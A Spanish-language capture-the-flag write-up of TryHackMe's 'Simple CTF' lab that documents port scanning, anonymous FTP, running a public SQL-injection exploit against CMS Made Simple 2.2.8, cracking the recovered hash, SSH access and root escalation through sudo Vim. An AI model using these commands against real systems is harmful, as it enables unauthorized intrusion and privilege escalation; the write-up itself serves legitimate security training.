---
layout: ../../layouts/WriteupLayout.astro
category: ctf
title: "Simple CTF | TryHackMe"
description: "Análisis y resolución documentada de Simple CTF: servicios expuestos, CMS vulnerable, acceso SSH y escalada mediante Vim."
---

# Simple CTF | TryHackMe

> Resolución documentada de **Simple CTF**, una máquina de dificultad fácil en TryHackMe.

## Contexto

El objetivo de esta práctica es encadenar varios hallazgos de baja complejidad hasta conseguir una shell privilegiada.


La IP utilizada durante la resolución es `10.10.71.52`.

## 1. Mapa inicial de la superficie

Primero compruebo que el objetivo está disponible y observo el TTL de la respuesta:

```bash
ping -c 1 10.10.71.52
```

```text
64 bytes from 10.10.71.52: icmp_seq=1 ttl=61 time=318 ms
```

El valor obtenido encaja con un host Linux, aunque esta deducción solo sirve como orientación inicial. La identificación real vendrá del escaneo de servicios.

### Puertos accesibles

Para localizar los puntos de entrada ejecuto un SYN scan sin resolución DNS:

```bash
nmap -n -sS -Pn -T5 10.10.71.52 -oG allPorts.txt
```

La máquina expone tres puertos:

```text
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  ssh
```

El puerto SSH no utiliza el valor habitual `22`, así que habrá que tenerlo en cuenta en cualquier intento de acceso posterior.

El siguiente escaneo añade detección de versiones y scripts básicos de reconocimiento:

```bash
nmap -p 21,80,2222 -sV -sC --min-rate 5000 10.10.71.52 -oN services.txt
```

| Puerto | Servicio detectado | Observación |
| ---: | --- | --- |
| `21` | `vsftpd 3.0.3` | El servidor acepta sesiones anónimas |
| `80` | Apache `2.4.18` | Aplicación web sobre Ubuntu |
| `2222` | OpenSSH `7.2p2` | Servicio SSH en puerto alternativo |

El resultado también revela referencias a rutas de aplicaciones web, por lo que continúo la investigación separando FTP y HTTP.

## 2. El FTP deja una pista

La configuración de FTP permite iniciar sesión como usuario anónimo. Compruebo qué contenido está disponible sin credenciales:

```bash
ftp 10.10.71.52
```

En la sesión navego hasta `pub` y descargo el único fichero visible:

```text
ftp> cd pub
ftp> ls
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
ftp> get ForMitch.txt
```

El documento no contiene una contraseña directamente. Sí deja una pista importante: una contraseña débil ha sido reutilizada para una cuenta del sistema. Por tanto, guardo el nombre del fichero y paso a buscar usuarios y versiones de software en el servicio web.

## 3. Enumeración de la aplicación web

El puerto `80` muestra inicialmente la página por defecto de Apache. Para ampliar el inventario de rutas utilizo Gobuster:

```bash
gobuster dir \
  -u http://10.10.71.52 \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x php,html,txt \
  -t 100
```

La ruta que cambia el rumbo de la investigación es `/simple`:

```text
http://10.10.71.52/simple               (Status: 200)
```

La aplicación identifica el producto como **CMS Made Simple 2.2.8**. Esta versión es relevante porque existe una vulnerabilidad de inyección SQL basada en tiempo, registrada como **CVE-2019-9053**.

## 4. Del CMS a una cuenta válida

Busco primero información pública del producto y de su versión:

```bash
searchsploit "CMS Made Simple 2.2.8"
```

Entre los resultados aparece el exploit `46635.py`, asociado a versiones anteriores a `2.2.10`. Lo copio localmente para analizarlo y ejecutarlo en el entorno de la máquina:

```bash
searchsploit -m php/webapps/46635.py
```

El script está pensado para Python 2 y recibe como parámetro la URL de CMS Made Simple:

```bash
python2 46635.py -u http://10.10.71.52/simple/
```

La consulta permite recuperar información de una cuenta interna:

```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

El valor obtenido no es una contraseña en claro. Se trata de un hash acompañado por su salt, con el formato compatible con `md5(salt + password)`. Utilizo Hashcat en el modo `20` y una wordlist local:

```powershell
.\hashcat.exe -a 0 -m 20 `
  0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 `
  .\rockyou.txt
```

El resultado es la contraseña `secret`. Este dato encaja con la advertencia del fichero obtenido por FTP: la contraseña de la aplicación también se estaba empleando para una cuenta del sistema.

## 5. Acceso interactivo por SSH

Con el usuario `mitch`, la contraseña recuperada y el puerto `2222`, pruebo el acceso remoto:

```bash
ssh mitch@10.10.71.52 -p 2222
```

Una vez dentro, verifico la identidad de la sesión y reviso el directorio personal:

```bash
whoami
ls
cat user.txt
```

```text
mitch
user.txt
G00d************
```

Ya existe una shell de usuario, así que el siguiente objetivo es conocer las capacidades administrativas de `mitch`.

## 6. Qué puede ejecutar `mitch`

La comprobación de privilegios delegados se realiza con:

```bash
sudo -l
```

La configuración permite ejecutar Vim como `root` sin solicitar contraseña:

```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Esto es suficiente para escalar porque Vim puede lanzar comandos del sistema desde su propia interfaz. Inicio la aplicación con la regla autorizada:

```bash
sudo /usr/bin/vim
```

Dentro de Vim ejecuto una shell Bash usando el comando externo:

```vim
:!/bin/bash
```

Compruebo el usuario de la nueva shell:

```bash
whoami
```

```text
root
```

La escalada se ha completado. Para cerrar la resolución, leo la flag del directorio de administración:

```bash
cd /root
ls
cat root.txt
```

```text
root.txt
W3ll****************
```

## Resultado

La vulnerabilidad no depende de un único fallo crítico. El acceso se construye sumando varios problemas de configuración y mantenimiento:

- FTP anónimo con información útil para continuar la investigación.
- Un CMS antiguo expuesto en una ruta accesible desde Internet.
- Reutilización de una contraseña débil entre la aplicación y el sistema.
- SSH accesible con un usuario válido.
- Permisos `sudo` que permiten ejecutar Vim como `root` sin autenticación.

La cadena completa queda así:

```text
21/tcp -> ForMitch.txt -> /simple -> CVE-2019-9053 -> mitch -> sudo vim -> root
```

## Referencias

- [TryHackMe - Simple CTF](https://tryhackme.com/room/easyctf)
- [Exploit-DB - CMS Made Simple < 2.2.10 SQL Injection](https://www.exploit-db.com/exploits/46635)
- [GTFOBins - Vim](https://gtfobins.github.io/gtfobins/vim/)
